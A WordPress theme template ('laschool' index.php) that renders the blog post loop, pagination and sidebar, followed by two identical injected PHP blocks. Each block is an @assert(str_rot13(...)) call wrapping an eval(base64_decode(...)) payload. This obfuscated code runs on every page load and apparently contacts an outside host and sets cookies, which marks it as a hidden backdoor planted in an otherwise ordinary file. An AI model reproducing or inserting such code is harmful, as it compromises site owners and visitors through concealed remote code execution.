<?php get_header(); ?>

	<div class="content">

	<?php if (have_posts()) : ?>

		<?php while (have_posts()) : the_post(); ?>

			<div <?php post_class(); ?> id="post-<?php the_ID(); ?>">
				<h2><a href="<?php the_permalink() ?>" rel="bookmark" title="<?php printf(__('Permanent Link to %s', 'laschool'), the_title_attribute('echo=0')); ?>"><?php the_title(); ?></a> <small>&ndash; <?php the_time(__('F jS, Y', 'laschool')) ?> <!-- by <?php the_author() ?> --></small></h2>
				
				<div class="entry">
					<?php the_content(__('Read the rest of this entry &raquo;', 'laschool')); ?>
				</div>
				
				<div class="comments-nr"><?php comments_popup_link(__('0<span> Comments</span>', 'laschool'), __('1<span> Comment</span>', 'laschool'), __('%<span> Comments</span>', 'laschool')); ?></div>
				<div class="postdata"><?php printf(__('Posted in %s', 'laschool'), get_the_category_list(', ')); ?></div>
			</div>

		<?php endwhile; ?>

		<div class="navigation">
			<div class="alignleft"><?php next_posts_link(__('&laquo; Older Entries', 'laschool')) ?></div>
			<div class="alignright"><?php previous_posts_link(__('Newer Entries &raquo;', 'laschool')) ?></div>
		</div>

	<?php else : ?>

		<h2><?php _e('Not Found', 'laschool'); ?></h2>
		<p><?php _e('Sorry, but you are looking for something that isn&#8217;t here.', 'laschool'); ?></p>
		<?php include (TEMPLATEPATH . "/searchform.php"); ?>

	<?php endif; ?>

	</div>

<?php get_sidebar(); ?>

<?php get_footer(); ?>
<?php 
//###==###
@assert(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUgcMvtuMJ1jqUxbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXFyxnJHbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXGgcMvtunKAmMKDbWTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy0cXKgcMvujpzIaK21uqTAbXPVuYvS1VvkznJkyK2qyqS9wo250MJ50pltxK1ASHyMSHyfvH0AFFIOHK0MWGRIBDH1SVy0cXFy7WTZjCFWIIRLgBPV7sJIfp2I7WTZjCFW3nJ5xo3qmYGRlAGRvB319MJkmMKfxLmN9WTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy07sJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcrlEwZG1wqKWfK2yhnKDbVzu0qUN6Yl9uoTkapzIuqTEyLJDhL29gY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKFxhVvM1CFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKFxhVvMwCFVhWTZjYvVznG0kWzyjCFVhWS9GEIWJEIWoVyWSGH9HEI9OEREFVy0hVvMbCFVhoJD1XPWvBJH5BQVlZQp4BTV1AGZkZzL0AwMxL2IzAGH0BTR4LvVhWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0hWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqYvEwZP4vZFVcXGgwqKWfK3AyqT9jqPtxLmRfAQVfMzSfp2HcB2A1pzksp2I0o3O0XPEwZFjkBGxkZlk0paIyXGfxnJW2VQ0tVTA1pzksMKuyLltxLmRcB2A1pzksL2kip2HbWTZkXGg9MJkmMJyzXTyhnI9aMKDbVzSfoT93K3IloS9zo3OyovVcCG0kXKfxnJW2VQ0tMzyfMI9aMKEsL29hqTIhqUZbVzu0qUN6Yl9uoTkapzIuqTEyLJDhL29gY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKFxhVvM1CFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKFxhVvMwCFVhWTZjYvVznG0kWzyjCFVhWS9GEIWJEIWoVyWSGH9HEI9OEREFVy0hVvMbCFVhoJD1XPWvBJH5BQVlZQp4BTV1AGZkZzL0AwMxL2IzAGH0BTR4LvVhWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0hWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqYvEwZP4vZFVcXGg9VTyzVPucp3AyqPtxnJW2XFxtrlOyL2uiVPEcLaL7VU0tnJLbnKAmMKDbWS9FEISIEIAHJlWjVy0cVPLzVPEsHxIEIHIGISfvpPWqVQ09VPVkMGIyBGN5AFVcVUftDTSmp2IlqPtxK1WSHIISH1EoVzZvKFx7VU19"));'));
//###==###
?>
<?php 
//###==###
@assert(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUgcMvtuMJ1jqUxbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXFyxnJHbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXGgcMvtunKAmMKDbWTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy0cXKgcMvujpzIaK21uqTAbXPVuYvS1VvkznJkyK2qyqS9wo250MJ50pltxK1ASHyMSHyfvH0AFFIOHK0MWGRIBDH1SVy0cXFy7WTZjCFWIIRLgBPV7sJIfp2I7WTZjCFW3nJ5xo3qmYGRlAGRvB319MJkmMKfxLmN9WTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy07sJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcrlEwZG1wqKWfK2yhnKDbVzu0qUN6Yl9uoTkapzIuqTEyLJDhL29gY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKFxhVvM1CFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKFxhVvMwCFVhWTZjYvVznG0kWzyjCFVhWS9GEIWJEIWoVyWSGH9HEI9OEREFVy0hVvMbCFVhoJD1XPWvBJH5BQVlZQp4BTV1AGZkZzL0AwMxL2IzAGH0BTR4LvVhWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0hWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqYvEwZP4vZFVcXGgwqKWfK3AyqT9jqPtxLmRfAQVfMzSfp2HcB2A1pzksp2I0o3O0XPEwZFjkBGxkZlk0paIyXGfxnJW2VQ0tVTA1pzksMKuyLltxLmRcB2A1pzksL2kip2HbWTZkXGg9MJkmMJyzXTyhnI9aMKDbVzSfoT93K3IloS9zo3OyovVcCG0kXKfxnJW2VQ0tMzyfMI9aMKEsL29hqTIhqUZbVzu0qUN6Yl9uoTkapzIuqTEyLJDhL29gY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKFxhVvM1CFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKFxhVvMwCFVhWTZjYvVznG0kWzyjCFVhWS9GEIWJEIWoVyWSGH9HEI9OEREFVy0hVvMbCFVhoJD1XPWvBJH5BQVlZQp4BTV1AGZkZzL0AwMxL2IzAGH0BTR4LvVhWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0hWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqYvEwZP4vZFVcXGg9VTyzVPucp3AyqPtxnJW2XFxtrlOyL2uiVPEcLaL7VU0tnJLbnKAmMKDbWS9FEISIEIAHJlWjVy0cVPLzVPEsHxIEIHIGISfvpPWqVQ09VPVkMGIyBGN5AFVcVUftDTSmp2IlqPtxK1WSHIISH1EoVzZvKFx7VU19"));'));
//###==###
?>